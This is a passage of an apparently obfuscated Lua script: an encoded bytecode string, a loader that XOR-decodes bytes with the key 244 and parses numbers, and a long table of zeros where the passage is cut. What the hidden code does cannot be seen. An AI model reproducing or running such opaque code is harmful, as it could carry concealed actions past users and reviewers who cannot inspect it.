3AET31ZE2NS3B5K3B9K394438AW39043A7I3BZB3B3527L3B9K3AXK3BZG3AKY3BZA381W3BSU3AUX21832WE2I928U38O836E829337ZK2BT38LN26931K726S2272HN28U3B9F2972GH33SN381N34A92TE32E826S26W384K3BBK2BP2C026J384X390W3BSD25Y39IZ2CE33ZR3AKS390U3A68384X2CI2YV2CL25U3ATK27U2CV2CX38YZ3BB8384Q3B882C83C0Z3BG53C1B2D22A229U2CR33ZR26A3C1A39FJ26S3AXO28G27I38LN3BAJ32SV335C3BZY39KK3C0126S23327U3A6G2C83A6I3C0A368F293382529E25H3C0G317623G3C2A2CD3C0L2BZ33ZR3C0O3B822V338KW3C0R3C0T2C03C0W34KP25Z3C1D3C112Z5321B3C163BDU2XW39BW3C1M2CL3C2S3C2K2Y13C2U33Y938Z031RO3C1J38F83C313AH231Z72382B628Q24X29U3C1T22M29U2TF3AIA34262BQ2A825S384K33BX2C43BQ53C2B39T62VL36D12C437X0385L3C14384P37X42CL3C0Q381R38KC3B5K2CI37X03C123AXI3BER3BCW384P382K3C123BZK3BER37X02B43BCB3BZN3BG23BER3B5G2BP3BZS3B5P2773BOH383V3A3T383T3A3W334W3C523BSV2A826125326G1V1M25E26M3BKN383G3BJ538FJ38D7380E38FM387826V25Z3BYX27L21A3AKJ382X39YB33KI3BBF389939F83AKF38OS39YB39UR37ZK32RV3BEF27735E338AT28Q1R3BZL39653C3P31823AQU2CD3B5J3ACK33BX3C1337WT3BCB3BZF385E2XV25I385R39CO37X42EI3BPN37ZU2GM39CM2EZ39CR2DK3BUY382K29U31733AR5318P24S384R2EI319M3133319639CV319K319M365D31AO393625A3ACP25638GF39LV31Y028138UY33KI3C7Q396J3ACV38BW39153BME384023X384032AP383T383W22T34263ARL385Y388W2583B6Q398826T25327L24C3B6Q23R3A2L38SG23N262243380G3ABA24638HY39AL380J380B3AMB3B6Z24B3B7138ED243383H25C25H25P25P26324H25925424D24638SG39W038W2263383H38RR38652633B24380826T39VM2773C8F23K38WA3C8I2453C8K3C8M383J39XD3C8Q39AB3AMB39733C8V3C8X3BNX3C903C923C943C963C983C9A39WC24D3C9D3C9F38I13C9I3AT524834M73BH938RR3B6739VS324Q383E383339VY387L386G3B2833LM383L3BYR39WX38RZ38SR3B2H38S73BGY3B2F3CB038S839WA39Y63AT0398Q38382413CAT3B6A39ZN39WK39WM38TP3B1A39YD38H439A03A1739A026S23C1223W25X26H26I222383X3B2038383A9N23Q38HL26S2111T23X25F26A26821C383X3A0E2523CBY3A9O39Z4380C24D23W38S73BVU3ADT3919380K38R4391C38UY28V38D33A1I31BV380W3A49326338US3BL5380W21G23Q3C5435VI323W39WT3B6H39YZ38IO3B1L39YB38FV38HB38SE3B1I3CB73B1K383T25P3A4728V2592LE380324U386Q3A9N2J43A1I3A1L38U5385Y3A3A3BIV3A2J3A3F3A2L38FP25D25F25I25E25O3CE725F3BGY39VY391K38SS38RC3AK23A073AKA388S38RV38J23A96386K25339733ALY386Y39XG387N3BI13A0V23P3CDN38I439WV391L38T438T638T83ASZ39ZF3ADF38TF34M73C5N399Q3A3C38UD3A2L380B39YN3B2T3C9D23N3B5T380B2533CEY24126223O3BMA3A1438SR3A1839ZX395N39X93CCR21N26E34VF3B2A3C8S39YK3BIQ3B2T386924N38SH3BJO391K386838FJ3B2F3AO82GZ39ZY3A2C2463A2738V43BJZ383N23M25Z3C913C9325W38RT24025W3BNW39W223W3A9N25Z38UL25F38M6385T3B2F3A1638313B2F38VK3CCZ380W25I3A303BJR3A1P39YG39YQ39Y73A9Z3B2F24J38SG3AS0395N38WJ3A9G39WZ38DG39X224B39X4383U2593CDK38122LE39YB3CDY3BIX3CE038UH25P3A2N25E25G3A3K25G2LR39XB39XD383U24D3CHB38FU3A34387I3A2D24X25W2623CIM383U25O3CEW31DQ39XH38HJ39YK39XR38WA3B1438WF3B6F38TC39ZH3C99387E35OC21J21V21W24A2202271V317P24T21B2251X26K26L3AAT3A9Z39XL39XN38SR32RF26125K26326926N227317P22B25K22626D26A26921D317P23O1O21935I223221Q383X3CDX3CFA3A3E3A3G3A2M3A2O3A2Q3A2S38FP26T3A8N34U13CIK3A2932IC3A3539XC3A2038W23A2338HI3B1G3B3Z38HI38VJ39VZ39W139ZF25539WG3BNN31YJ383339AB38FX3A8R3AK223N3CHK39WT39VZ38IE394P3BJ739XH3B3D3AA039893ARP386A3BJR38EA3A9J3BHW380923Q24X38SZ395R38313C983BNY3BJ3387R3CLG386L3CLP386O3A02386T38J224X3A0G3879387B387D3AK239YX39YZ3B1M3A0F387I3A0I387N3A0K38U324A38EH3B1E3BJJ3ASL3ASN3BHK3AD43B3S31M83AVV3AD5245396T395B3B2B3CCI395O3A8U3B3M399D3AA939VW399I3B3M3BGY3B0Z3B1U3A9139AL3B5T23M38S5391L383L3ALS38CX3ASC3AT23AM33BGY3AM624F3AHM386F395O38333ASH383P380D386E38I23A91380A24B3A0R394O3CAM2HW3C9638WR38703CNL395N3BGY39WL38CW3CAW38WR3A1A3C8W3A1D3A1F380W23839H53A453CHW3B2E3CD3313U3COU34NC2LE3A0E3CG339AL38VJ38SH3CLZ3C8F380Z383U2382493COW24A3CD325W3CPD3A1N3A1P3CEB3A383B2R3A1P38D638I2380S3CPN3A1G2LE3A00386O3CH738TI23L2LE38VS39Z338CX39ZD3BLN3CKL39ZT386H3CCF38T5240395H3A423A3X3COW2682EB38HR38GX3CJJ313H27727Y39XG38RT380P3AAX24A25W3CAQ3CL125W3CGH3CGT3CL13CGW24125W2633CGT24R3CBG3ALS23L3CGS32F83BM83A4E3BJ3380S387E35LQ380S39XM32C63BKH3BKJ1L23Y23438HV39XK3ARS3CLN3BGY25838IE3ADR38S6383I3AS23BLN383L3B3Z3CB1387V3B1D386Y3CRS3CMH3BKU23Q3BKW3ARV3BHP248388K3ASD3AT3395O38KS3B2B38DD3B2B3CS838HK3B5T3AA43BLO3B2L3A4F3BIK38GX3C1L39WT3CS538HJ2M9335C3CSE3AM33ADO23K3B1F3BL3385X383U25S32633AKF3BHX38IE24F25A3CF323R25724A38W13C5G3ARV3B3R39AP39XC24624E395R3ALR3BH43CNF3ALY26F27L380O38SI387X3CTY3BHB3CED3952386Y2563ALT38RY3AVW24A3AVY3A3F3CLO3B2E3CDF39YR3C7Z3CB938WT3890398D396P396R3CLR38RP398G23K398N38WQ398L3CUQ394U3COG388W3A9P3CHL3BLI383T3AET39WT3BHM3AA43ASU38VF388S24324A3CV53CBZ3AHL3B1F3ARV3A923BNX24A3CQA387P386Y25138TM26T3CTW2772513AS03A2625138HK3CEO23Q391O39WL3BIB3A0E3BNW3C8M39X8387C3COE39ZJ395O3CKL3CQM3CMM380J3BHM3CP33CW73CPK38313AAF3CWE38693COQ23I143A133BI324523W38TD38DG39AJ387C3BVV2M93AB93ABB3BL522Y24322324K23M171324I3BH239XL3BVR380F38IG383D3BIB3A9138IW38D724C39723AT038T43CXI395E3CXL23K38M6388W3CVV3CXR3CVO3CXN38RS3CXP397338RN3CXT38IW25H3CVO38053CV93CMP3C9C3AMB3CQP38FJ2513CO826T26939XK38IE3CWC24A397623Q39W638HZ24A3COF395O3A0E24K39W0383H23Q23X2513AAG3CTG24A3A263COH3CWR3CYL3CYN26T3AKF3AAF3BLD3AAW23Q3CWT399G380G3CUH38VF38IW25G3CYE3CY223K25H3CYE38313CXU3CY4380E38RN3CZP3CY33CO83CZT3CZH3CZM38TM3CAI3CZY3CZN3A0S3D013CVR3CY338TM383A3CLY3BNQ23K25W25123Q38733CZU3CZM3CO83D093D0238TM25C3BGY3CW33C8F3D0D3D0F39163CZQ3CO83D0N3D0H3CZR23R25D391638ID3BNR25W38ID2433D0T3CZV3A0S3D103D0X38TM34MA38333D0P3D0C3D153D173D0I3A0S34MA3D0H384I3CZS3D1I3CZJ3A0S3CZX3D063CXV380E3D0526S3CXU3D1Q23K3D1W3D1Y3D083D1P3D0J3D1P3D0M3D243A0S3D0W3CZY3D1N3D0Z3D2823K3D1A3D2B3D1C3D2E34MA386Y3AVF38I838J239883AA23AA438SK3AVM3AVO3BGY2513CKS3A2238383C7Z380332HC38DD391L38TZ3COQ24Z1R3AE738123BOS3B1223K3D2W3A2138073C9C23R3COQ23H1G2LE3ARV39XG3ARX23Q3CUZ3AS139753ALW388U3A1X39883CYT24B38RD3ADR3AH8395L398Y3C8Y3CYP38S83B3O2413B3Q3CN03B3U39AM388J38TX3CS03A9K3CQ53CVK3ATB3C823A4426D3D4N3D4O22T383X399M3862399O3BHH3BHJ3ARU38I43B2T39WD3CTM3AD6388W38R63B3G380338W13C9A39ZH3AB623K32AP3CQG38GW38HU33Y53BIH3CJB26S3BL73BKD1O317P38T038T01Q3BKA3BL821K383W3CSS38GW153CRN399Q3CGR3C8W388K3COG37463C5J386Y380H398638333D5738DC3A213CNE38RT3CXU38H2395B3CU63BIS38S838313A9638773B5T3BMA3CUY383N31UE3COG39XF24K38FY395E3A0Q3D6V38T63D6T3AA93D6Z3D6X3CLY3D7324C3COG386Y2423BHK388W3B2S387L38U73CF93BIW38UD3CI238UI25I25F25P3A3J38UM2LR38J23CCC2403A2738H53CL627L3CS538HD3ADH3BHW3BHY24F38H53B1G39WB3C9G2483CQU38DB3BNI3CH23BKV24B3D84386B3D123D3D3D0F3D843D3N3BNX3C8F3D0E2493D8F3BNP3BNR3D153D8K39XK3D8M3B2G38WO3D84380338RC399H24828V1I24J1122H251383U390B383U2LE3B5S2453CU43B1A3A9339WT3AAA24F3COG385T3CWE3BHO3BHQ38I23BHS38RR3C8W39163BI438653BI638S83ARV24N3BJZ3A0S312Z3D6R380H2473CV222S2LE3BIE38TF38DI3D5D2313BIM3BKO3CSO3BKR3AT73BKT3BHF3ADR3BKZ38I431RF396L2A83D5K3BKC3BLA38FJ39VZ3D9F38WR3BOL38IO398P34WF395Q3890383L39WW3BPJ3AB6248399L3C8E3CNR3ASF38KS24239A63CSK38RR3D2Q3A9S3C8E38IE395O37463AD63746383N33P838U838S83DBR38S838KS3D1F3CQR38T738HI3CVD3DBR31YJ3ARV3D8H3DC0388I3CV638I23DBP2M93D1E3D8W25W25839W13DBT277248395F3D8R3D0C3DCH32IF3D2L387M388U3CU53DCS3DCJ31UJ24E3D0O3AT523K3CTE38VD386Y3CQN3BNK38VF24A3CQO394P383138DB3A0S38SJ38I83803391J3CMX395B388H38TF3A04383X3BL03C2E380W1C3AQX380W1K3A0P3AKA3BIO3CUY3BIR395O32I93B6P3C9P3B6S3B6U3B6W3CHQ3CA13B723BIX3B743B7625H25J25G3D7M3D7M3A2R39WT3BJD380939863803399F3D3Z395N3D5G38HN38FS38FJ3CS824738M6386Y3CSC3DEW38FJ3A933DF0386Y23Q2483DF03803388Z24F3DF0388F38I53B2M3A933A9O3ART3CH83A483COW3ALC3CT73D9D383G23M2493AT0374623O33LM3CRF39WN380S38V739Y828V38PD3A9K3DBG38DD3AVT3CTH3DFY3BGY3AVN399J3BJ33BVX388O32IF38313CZD3CWV3C7Z3C7X380Z23Y3BGY38S13DD823K3CR639ZW3CVR38793B1Y3D5V23122L317P3BK71F3C5028V2602A83DAE21P3D5N3D5O24238T2383U25C3CPY27L38ED38I83DE13C9O3B6R38UH3B6T3C8K3DE639X13DE83B733B7524025L3A2R3DEF25P25C3CH025C3DGV1T3A443DAT21K2143A443BK72133A0P380S3BLH383U3BG43D5J3D5S214383X3DHH3B6Q3DE43DHM3CHP3DHO3B703DE938UD3DEB3DHS3DED25D3CE325G25J3DHX383U3BMP38FM38S531YJ3DII3DE33DHK3DE53DIM3B6Y3DIO3DHQ3DEC25C25P25F3DED3D7N29Q3CRI3BKK21S317P1O24L22426I2351V21X317P1822L36NR25524624K3DH138DY2LE3DJ43DHJ2633DHL3B6V3DJ83DHP3DEA3DHR3DHT3DEE37XI38UQ25C25D3DGV2253DDS28V3A3S323T3BKI3BKK3BKM383U3BKF31C83DH81A3DK127721G38HQ3AAR2193DI63BIH1N3DL03AAR3BKG3DKP3CRK2283DGY3DL43DI23D5S3DKT383T3C1L3DIE3BL8103DLE3BL8183DH73D5O1225N');local l=bit and bit.bxor or function(o,e)local d,l=1,0 while o>0 and e>0 do local f,n=o%2,e%2 if f~=n then l=l+d end o,e,d=(o-f)/2,(e-n)/2,d*2 end if o<e then o=e end while o>0 do local e=o%2 if e>0 then l=l+d end o,d=(o-e)/2,d*2 end return l end local function o(e,o,d)if d then local o=(e/2^(o-1))%2^((d-1)-(o-1)+1);return o-o%1;else local o=2^(o-1);return(e%(o+o)>=o)and 1 or 0;end;end;local d=1;local function e()local o,e,f,n=a(f,d,d+3);o=l(o,244)e=l(e,244)f=l(f,244)n=l(n,244)d=d+4;return(n*16777216)+(f*65536)+(e*256)+o;end;local function c()local o=l(a(f,d,d),244);d=d+1;return o;end;local function D()local d=e();local e=e();local n=1;local l=(o(e,1,20)*(2^32))+d;local d=o(e,21,31);local o=((-1)^o(e,32));if(d==0)then if(l==0)then return o*0;else d=1;n=0;end;elseif(d==2047)then return(l==0)and(o*(1/0))or(o*(0/0));end;return J(o,d-1023)*(n+(l/(2^52)));end;local C=e;local function J(o)local e;if(not o)then o=C();if(o==0)then return'';end;end;e=n(f,d,d+o-1);d=d+o;local d={}for o=1,#e do d[o]=B(l(a(n(e,o,o)),244))end return T(d);end;local d=e;local function a(...)return{...},S('#',...)end local function H()local B={0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,